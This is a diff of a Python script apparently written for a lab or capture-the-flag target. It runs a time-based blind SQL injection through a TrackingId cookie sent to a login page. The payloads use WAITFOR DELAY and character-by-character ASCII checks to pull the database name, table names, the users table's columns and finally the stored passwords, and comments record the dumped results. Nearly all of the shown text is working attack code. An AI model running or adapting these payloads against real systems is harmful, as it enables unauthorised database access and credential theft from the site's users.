@@ -27,11 +27,10 @@ def sqli():
             #query=f"'IF%20(ASCII(substring(db_name(),{num},1))={char})%20WAITFOR%20DELAY%20'0:0:4'--%20-" 
                 # Above query retrieved database name: d4y
             #query=f"'IF%20(ASCII(substring((SELECT table_name from information_schema.tables where table_catalog='d4y' ORDER BY table_name OFFSET 2 ROWS FETCH NEXT 1 ROWS ONLY),{num},1))={char})%20WAITFOR%20DELAY%20'0:0:4'--%20-" 
-                # above query dumped: captcha, trackingid, users, 
+                # above query change offset number to dump different rows.  Dumped: captcha, trackingid, users, 
             #query=f"'IF%20(ASCII(substring((SELECT column_name from information_schema.columns where table_name='users' and table_catalog='d4y' ORDER BY column_name OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY),{num},1))={char})%20WAITFOR%20DELAY%20'0:0:4'--%20-"
-                # Above query dumped: email, password ,role
-            query=f"'IF%20(ASCII(substring((SELECT password from users),{num},1))={char})%20WAITFOR%20DELAY%20'0:0:4'--%20-"
-                # Above query dumped: admin@d4y.at,   
+                # Above query change offset number to dump different rows.  Dumped: email, password
+            query=f"'IF%20(ASCII(substring((SELECT password from users),{num},1))={char})%20WAITFOR%20DELAY%20'0:0:4'--%20-" 
             cookies= {"PHPSESSID":"sgm1rktemjonb0bao4elfttmet",
                     "TrackingId":f"{query}"}
             response= requests.post(url=f"http://{target}/login.php", proxies=proxies, headers=headers, data=data, cookies=cookies, allow_redirects=True)
